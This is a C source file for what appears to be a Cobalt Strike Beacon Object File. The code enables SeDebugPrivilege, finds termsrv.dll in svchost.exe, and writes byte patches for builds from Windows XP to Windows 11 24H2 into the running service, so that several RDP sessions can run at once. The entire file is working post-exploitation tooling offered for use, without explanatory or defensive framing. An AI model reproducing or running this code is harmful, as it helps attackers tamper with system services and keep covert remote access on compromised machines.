#ifdef _WIN64
// Minimal stub for stack-probing if the compiler inserts ___chkstk_ms
__declspec(naked) void ___chkstk_ms(void)
{
    __asm__("ret");
}
#endif

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "WarpWorld.h"
#include "beacon.h"



// Patterns
BYTE PTRN_WIN5_TestLicence[]          = {0x83, 0xf8, 0x02, 0x7f};
BYTE PATC_WIN5_TestLicence[]          = {0x90, 0x90};

BYTE PTRN_WN60_Query__CDefPolicy[]    = {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x75};
BYTE PATC_WN60_Query__CDefPolicy[]    = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0xeb};

BYTE PTRN_WN6x_Query__CDefPolicy[]    = {0x39, 0x87, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PATC_WN6x_Query__CDefPolicy[]    = {0xc7, 0x87, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};

BYTE PTRN_WN81_Query__CDefPolicy[]    = {0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PATC_WN81_Query__CDefPolicy[]    = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};

BYTE PTRN_W10_1803_Query__CDefPolicy[]= {0x8b, 0x99, 0x3c, 0x06, 0x00, 0x00, 0x8b, 0xb9, 0x38, 0x06, 0x00, 0x00, 0x3b, 0xdf, 0x0f, 0x84};
BYTE PATC_W10_1803_Query__CDefPolicy[]= {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0xe9};

BYTE PTRN_W10_1809_Query__CDefPolicy[]= {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PATC_W10_1809_Query__CDefPolicy[]= {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};

BYTE PTRN_W11_24H2[]                  = {0x8B, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x75};
BYTE PATC_W11_23H2[]                  = {0xB8, 0x00, 0x01, 0x00, 0x00, 0x89, 0x81, 0x38, 0x06, 0x00, 0x00, 0x90};
BYTE PATC_W11_24H2[]                  = {0xB8, 0x00, 0x01, 0x00, 0x00, 0x89, 0x81, 0x38, 0x06, 0x00, 0x00, 0x90, 0xEB};

PATCH_GENERIC TermSrvMultiRdpReferences[] =
{
    {2600,  {sizeof(PTRN_WIN5_TestLicence), PTRN_WIN5_TestLicence},
            {sizeof(PATC_WIN5_TestLicence), PATC_WIN5_TestLicence}, {3}},
    {6000,  {sizeof(PTRN_WN60_Query__CDefPolicy), PTRN_WN60_Query__CDefPolicy},
            {sizeof(PATC_WN60_Query__CDefPolicy), PATC_WN60_Query__CDefPolicy}, {0}},
    {7600,  {sizeof(PTRN_WN6x_Query__CDefPolicy), PTRN_WN6x_Query__CDefPolicy},
            {sizeof(PATC_WN6x_Query__CDefPolicy), PATC_WN6x_Query__CDefPolicy}, {0}},
    {9600,  {sizeof(PTRN_WN81_Query__CDefPolicy), PTRN_WN81_Query__CDefPolicy},
            {sizeof(PATC_WN81_Query__CDefPolicy), PATC_WN81_Query__CDefPolicy}, {0}},
    {17134,{sizeof(PTRN_W10_1803_Query__CDefPolicy), PTRN_W10_1803_Query__CDefPolicy},
            {sizeof(PATC_W10_1803_Query__CDefPolicy), PATC_W10_1803_Query__CDefPolicy}, {0}},
    {17763,{sizeof(PTRN_W10_1809_Query__CDefPolicy), PTRN_W10_1809_Query__CDefPolicy},
            {sizeof(PATC_W10_1809_Query__CDefPolicy), PATC_W10_1809_Query__CDefPolicy}, {0}},
    {22631,{sizeof(PTRN_W11_24H2), PTRN_W11_24H2},
            {sizeof(PATC_W11_23H2), PATC_W11_23H2}, {0}},
    {26100,{sizeof(PTRN_W11_24H2), PTRN_W11_24H2},
            {sizeof(PATC_W11_24H2), PATC_W11_24H2}, {0}},
};

// Forward declarations
BOOL PatchMemory(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_T region_size, BYTE *pattern,
    SIZE_T patternSize, BYTE *patch, SIZE_T patchSize, LONG offset);
PATCH_GENERIC *GetPatchGenericFromBuild(PATCH_GENERIC *generics, SIZE_T cbGenerics, DWORD buildNumber);
dll_info * get_dll_info(char * dll_name, BOOL verbose);


int GetWindowsBuildNumber()
{
    HMODULE hMod = KERNEL32$GetModuleHandleW(L"ntdll.dll");
    if(hMod) {
        RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)KERNEL32$GetProcAddress(hMod, "RtlGetVersion");
        if(pRtlGetVersion) {
            RTL_OSVERSIONINFOW rovi;
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            if(pRtlGetVersion(&rovi) == 0) {
                return rovi.dwBuildNumber;
            }
        }
    }
    return -1; // rip
}

BOOL EnableSeDebugPrivilege()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES priv;
    LUID luid;

    // Open process token
    if (!ADVAPI32$OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        DWORD e = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed, err=%lu\n", e);
        return FALSE;
    }

    // Check for SeDebugPrivilege
    if (!ADVAPI32$LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        DWORD e = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValueA(SeDebugPrivilege) failed, err=%lu\n", e);
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Apply privileges
    if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &priv, sizeof(priv), NULL, NULL)) {
        DWORD e = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges failed, err=%lu\n", e);
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    DWORD e = KERNEL32$GetLastError();
    if (e == ERROR_NOT_ALL_ASSIGNED) {
        BeaconPrintf(CALLBACK_ERROR, "SeDebugPrivilege not assigned (ERROR_NOT_ALL_ASSIGNED)\n");
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] SeDebugPrivilege enabled!\n");
    KERNEL32$CloseHandle(hToken);

    return TRUE;
}


BOOL PatchTermService(PATCH_GENERIC *generics, SIZE_T cbGenerics, PCWSTR moduleName)
{
    BOOL result = FALSE;
    DWORD buildNumber = GetWindowsBuildNumber();
    //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Windows build number: %lu\n", buildNumber);

    PATCH_GENERIC *currentReferences = GetPatchGenericFromBuild(generics, cbGenerics, buildNumber);
    if(currentReferences) {
        //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Found references for build=%lu\n", buildNumber);

        //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Searching for termsrv.dll in svchost.exe...\n");
        dll_info * termsrv = get_dll_info("termsrv.dll", TRUE);
        if(!termsrv) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Could not find termsrv.dll in any svchost.exe!\n");
            return FALSE;
        }
        DWORD processId = termsrv->pid;
        //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Found TermService in PID=%lu, baseAddr=%p, size=%d\n",
            //processId, termsrv->dll_addr, termsrv->dll_size);

        HANDLE hProcess = KERNEL32$OpenProcess(
            PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
            FALSE,
            processId
        );
        if(hProcess) {
            //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Opened process PID=%lu successfully.\n", processId);

            LPVOID baseAddress = termsrv->dll_addr;
            SIZE_T imageSize   = termsrv->dll_size;
            //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] termsrv base=%p, size=%zu\n", baseAddress, (SIZE_T)imageSize);

            MEMORY_BASIC_INFORMATION mbi;
            SIZE_T totalPatched = 0;

            for(LPBYTE address = (LPBYTE)baseAddress;
                address < (LPBYTE)baseAddress + imageSize;
                address += mbi.RegionSize)
            {
                SIZE_T vqSize = KERNEL32$VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi));
                if(vqSize == sizeof(mbi)) {
                    if(mbi.State == MEM_COMMIT &&
                      (mbi.Protect == PAGE_EXECUTE_READ || mbi.Protect == PAGE_EXECUTE_READWRITE))
                    {
                        //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Checking region @%p, size=%zu, state=MEM_COMMIT, protect=0x%x\n",
                            //address, mbi.RegionSize, mbi.Protect);

                        BOOL patched = PatchMemory(
                            hProcess,
                            address,
                            mbi.RegionSize,
                            currentReferences->Search.Pattern,
                            currentReferences->Search.Length,
                            currentReferences->Patch.Pattern,
                            currentReferences->Patch.Length,
                            currentReferences->Offsets.off0
                        );
                        if(patched) {
                            BeaconPrintf(CALLBACK_OUTPUT,
                                "[+] '%ls' service patched at address=%p\n",
                                moduleName, address
                            );
                            totalPatched++;
                            // First service patched should be fine, so we break
                            break;
                        }
                    }
                    else {
                        //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Region @%p not suitable (State=0x%x Protect=0x%x)\n",
                            //address, mbi.State, mbi.Protect);
                    }
                } else {
                    DWORD e = KERNEL32$GetLastError();
                    BeaconPrintf(CALLBACK_ERROR,
                        "[-] VirtualQueryEx failed @%p with err=%lu\n", address, e
                    );
                }
            }

            if(totalPatched > 0) {
                result = TRUE;
            }
            else {
                BeaconPrintf(CALLBACK_OUTPUT, "[-] No matching pattern found in memory.\n");
            }

            KERNEL32$CloseHandle(hProcess);
        } else {
            DWORD e = KERNEL32$GetLastError();
            BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess(PID=%lu) failed, err=%lu\n", processId, e);
        }
    } else {
        //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] No references found for build=%lu\n", buildNumber);
    }

    return result;
}

BOOL PatchMemory(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_T region_size,
                 BYTE *pattern, SIZE_T patternSize, BYTE *patch, SIZE_T patchSize, LONG offset)
{
    BYTE *buffer;

    if (region_size <= 4096) {
        buffer = (BYTE *)_alloca(region_size); 
    } else {
        buffer = (BYTE *)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, region_size);
        if (!buffer) {
            BeaconPrintf(CALLBACK_ERROR, "[PatchMemory] alloc of %zu bytes failed.\n", region_size);
            return FALSE;
        }
    }

    SIZE_T bytesRead;
    BOOL result = FALSE;

    if (KERNEL32$ReadProcessMemory(hProcess, lpBaseAddress, buffer, region_size, &bytesRead) && bytesRead == region_size) {
        for (SIZE_T i = 0; i + patternSize <= region_size; i++) {
            if (MSVCRT$memcmp(buffer + i, pattern, patternSize) == 0) {
                DWORD oldProtect;
                LPVOID patchAddr = (LPVOID)((BYTE *)lpBaseAddress + i + offset);

                if (KERNEL32$VirtualProtectEx(hProcess, patchAddr, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                    SIZE_T bytesWritten;
                    if (KERNEL32$WriteProcessMemory(hProcess, patchAddr, patch, patchSize, &bytesWritten) && bytesWritten == patchSize) {
                        result = TRUE;
                    }
                    KERNEL32$VirtualProtectEx(hProcess, patchAddr, patchSize, oldProtect, &oldProtect);
                }
                break;
            }
        }
    }

    if (region_size > 4096) {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buffer);
    }

    return result;
}


PATCH_GENERIC *GetPatchGenericFromBuild(PATCH_GENERIC *generics, SIZE_T cbGenerics, DWORD buildNumber)
{
    PATCH_GENERIC *bestMatch = NULL;
    //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Searching patch references for buildNumber=%lu among %zu references...\n", buildNumber, cbGenerics);

    for (SIZE_T i = 0; i < cbGenerics; i++) {
        //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Checking generics[%zu].MinBuildNumber=%lu\n", i, generics[i].MinBuildNumber);

        if (generics[i].MinBuildNumber <= buildNumber) {
            if (bestMatch == NULL || generics[i].MinBuildNumber > bestMatch->MinBuildNumber) {
                bestMatch = &generics[i];
            }
        }
    }

    if(bestMatch) {
        //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Found best match, MinBuildNumber=%lu\n", bestMatch->MinBuildNumber);
    }
    else {
        //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] No match found for build=%lu\n", buildNumber);
    }
    return bestMatch;
}

dll_info * get_dll_info(char * dll_name, BOOL verbose)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] get_dll_info(%s)\n", dll_name);

    dll_info * dll = (dll_info*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(dll_info));
    if(!dll) {
        BeaconPrintf(CALLBACK_ERROR, "[get_dll_info] alloc failed.\n");
        return NULL;
    }

    HANDLE hProcessSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hProcessSnap == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS) failed.\n");
        return NULL;
    }
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if(!KERNEL32$Process32First(hProcessSnap, &pe32)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Process32First() failed.\n");
        KERNEL32$CloseHandle(hProcessSnap);
        return NULL;
    }
    do {
        if(!MSVCRT$strcmp("svchost.exe", pe32.szExeFile)) {
            if(verbose) {
                //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Found svchost.exe [%d]\n", pe32.th32ProcessID);
            }
            HANDLE hModuleSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
            if(hModuleSnap == INVALID_HANDLE_VALUE) {
                if(verbose) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[-] CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, %d) failed.\n", pe32.th32ProcessID);
                }
                continue;
            }

            MODULEENTRY32 me32;
            me32.dwSize = sizeof(MODULEENTRY32);
            if(!KERNEL32$Module32First(hModuleSnap, &me32)) {
                if(verbose) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[-] Module32First() failed for PID=%d.\n", pe32.th32ProcessID);
                }
                KERNEL32$CloseHandle(hModuleSnap);
                continue;
            }

            do {
                if(verbose) {
                    //BeaconPrintf(CALLBACK_OUTPUT, "  [0x%p] %s (size=%d bytes)\n", me32.modBaseAddr, me32.szModule, me32.modBaseSize);
                }
                if(!MSVCRT$strcmp(dll_name, me32.szModule)) {
                    // found
                    dll->pid       = pe32.th32ProcessID;
                    dll->dll_addr  = me32.modBaseAddr;
                    dll->dll_size  = me32.modBaseSize;
                    KERNEL32$CloseHandle(hModuleSnap);
                    KERNEL32$CloseHandle(hProcessSnap);
                    return dll;
                }
            } while(KERNEL32$Module32Next(hModuleSnap, &me32));

            KERNEL32$CloseHandle(hModuleSnap);
        }
    } while(KERNEL32$Process32Next(hProcessSnap, &pe32));

    //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] get_dll_info: not found '%s' in any svchost.exe.\n", dll_name);
    KERNEL32$CloseHandle(hProcessSnap);
    return NULL;
}

void go(char *args, int length)
{
    // Check for SeDebugPrivilege and try to enable
    if(!EnableSeDebugPrivilege()) {
       BeaconPrintf(CALLBACK_ERROR, "[-] Could not enable SeDebugPrivilege, aborting.\n");
       return;
    }

    // Start patching
    BOOL success = FALSE;
    {
        BOOL res = FALSE;
        res = PatchTermService(
            TermSrvMultiRdpReferences,
            sizeof(TermSrvMultiRdpReferences)/sizeof(TermSrvMultiRdpReferences[0]),
            L"termsrv.dll"
        );
        if(res) {
            BeaconPrintf(CALLBACK_OUTPUT, "Patch completed successfully! You can now Multi-RDP on the host.\n");
            success = TRUE;
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Patch failed!\n");
        }
    }

}
